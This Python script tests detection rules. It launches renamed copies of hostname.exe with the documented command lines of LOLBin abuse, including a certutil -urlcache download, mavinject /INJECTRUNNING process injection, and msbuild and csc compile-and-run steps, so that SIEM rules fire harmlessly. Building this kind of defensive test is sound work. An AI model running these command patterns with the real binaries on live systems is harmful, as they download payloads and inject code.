#!/usr/bin/env python3
"""
LOLBin Name + Command-Line Match Tester -- Zero-Payload Edition
==================================================================
Generates Windows process-creation events that look like real LOLBin abuse
in every field a detection rule typically inspects (Image name, full
CommandLine, optionally ParentImage) -- while the binary that actually
executes is always an unmodified copy of hostname.exe.

WHY THIS IS STILL SAFE
-----------------------
Windows records the full command line at CreateProcess time, before the
target binary parses a single argument. So we can hand a renamed
hostname.exe the exact argument strings a real attack would use (these
are public, well-documented patterns from LOLBAS/MITRE ATT&CK) and the
Sysmon/EDR event will show a realistic Image + CommandLine pair -- but
hostname.exe has no code that does anything with "/INJECTRUNNING" or a
".cab" path. It either ignores the args or errors out immediately.
Either way, no injection, compilation, cabinet, or network operation ever
actually runs. There is exactly one binary in this entire test: a plain
copy of C:\\Windows\\System32\\hostname.exe.

WHAT'S NEW VS. THE SIMPLER VERSION
------------------------------------
1. Each decoy is launched with the real documented command-line syntax
   for that LOLBin's abuse (matches rules that inspect CommandLine, not
   just Image name).
2. Optional: launch via "cmd.exe /c <decoy>" so ParentImage == cmd.exe,
   matching rules that also check for a shell-spawned parent (toggle
   SPAWN_VIA_CMD below).

REQUIREMENTS: Windows only.
"""

import os
import platform
import shutil
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path

# Flip to True to also simulate a shell-spawned parent process
# (matches rules like "ParentImage == cmd.exe AND Image == mavinject.exe").
SPAWN_VIA_CMD = False

# The ONLY code that ever actually executes. hostname.exe: prints the
# local computer name, has no argument-triggered functionality, no GUI,
# no network access, no file writes.
SAFE_SOURCE_BINARY = r"C:\Windows\System32\hostname.exe"

# name -> (documented real-world command line, ATT&CK technique)
# Argument strings are the well-known public LOLBAS syntax. Files
# referenced (e.g. decoy.dll, decoy.cab) do not need to exist -- hostname.exe
# never opens them.
LOLBIN_TEST_CASES = {
    "mavinject.exe": {
        "args": lambda: [str(os.getpid()), "/INJECTRUNNING", "decoy_payload.dll"],
        "technique": "T1218 / T1055.001 - Process injection via signed binary",
    },
    "ilasm.exe": {
        "args": lambda: ["decoy_payload.il", "/output=decoy_output.exe"],
        "technique": "T1027 / T1218 - Compile IL to EXE to evade static AV",
    },
    "diantz.exe": {
        "args": lambda: ["decoy_source.txt", "decoy_archive.cab"],
        "technique": "T1560.001 - Cabinet file creation for staging/exfil",
    },
    "certutil.exe": {
        "args": lambda: ["-urlcache", "-split", "-f", "https://example.com/decoy.txt", "decoy.txt"],
        "technique": "T1140 / T1105 - Encode/decode or download payloads",
    },
    "csc.exe": {
        "args": lambda: ["/out:decoy_output.exe", "decoy_payload.cs"],
        "technique": "T1027 / T1127 - Compile C# source to EXE at runtime",
    },
    "msbuild.exe": {
        "args": lambda: ["decoy_project.csproj"],
        "technique": "T1127.001 - Execute arbitrary code via malicious .csproj",
    },
}


def main():
    if platform.system() != "Windows":
        print("This script copies a native Windows binary (hostname.exe) "
              "and must be run on Windows. Exiting without doing anything.")
        sys.exit(1)

    if not Path(SAFE_SOURCE_BINARY).exists():
        print(f"Could not find {SAFE_SOURCE_BINARY} -- aborting, nothing was run.")
        sys.exit(1)

    work_dir = Path(tempfile.mkdtemp(prefix="lolbin_nametest_"))
    print("=" * 72)
    print("LOLBin Name + Command-Line Tester (zero-payload)")
    print("=" * 72)
    print(f"Underlying binary for every case: {SAFE_SOURCE_BINARY}")
    print(f"Parent process simulation: {'cmd.exe' if SPAWN_VIA_CMD else 'this python process'}")
    print(f"Temp working directory: {work_dir}\n")

    log = []
    try:
        for name, cfg in LOLBIN_TEST_CASES.items():
            decoy_path = work_dir / name
            shutil.copy2(SAFE_SOURCE_BINARY, decoy_path)

            args = cfg["args"]()
            if SPAWN_VIA_CMD:
                cmd = ["cmd.exe", "/c", str(decoy_path)] + args
            else:
                cmd = [str(decoy_path)] + args

            print(f"[*] {name}  ({cfg['technique']})")
            print(f"    command: {' '.join(cmd)}")
            ts = datetime.now().isoformat()
            try:
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                status = f"exited on its own (rc={proc.returncode})"
            except subprocess.TimeoutExpired:
                status = "did not exit within 10s (unexpected)"
            except Exception as e:
                status = f"error: {e}"

            print(f"    -> {status}\n")
            log.append({"decoy_name": name, "timestamp": ts, "command": " ".join(cmd), "status": status})
            time.sleep(1)
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)

    print("Done. Cross-reference the timestamps/commands above against QRadar")
    print("to confirm each rule fired on Image name and/or CommandLine.\n")
    print("Scope notes:")
    print(" - Decoys run from a temp folder, not the LOLBin's real System32/.NET")
    print("   path -- rules that also check path won't fire here.")
    print(" - Internal PE metadata (OriginalFilename) still says HOSTNAME --")
    print("   rules keyed on that instead of on-disk filename won't fire here.")
    print(" - Exactly one binary executed this entire run: hostname.exe. No")
    print("   injection, compilation, cabinet, or network code ever ran.")


if __name__ == "__main__":
    main()
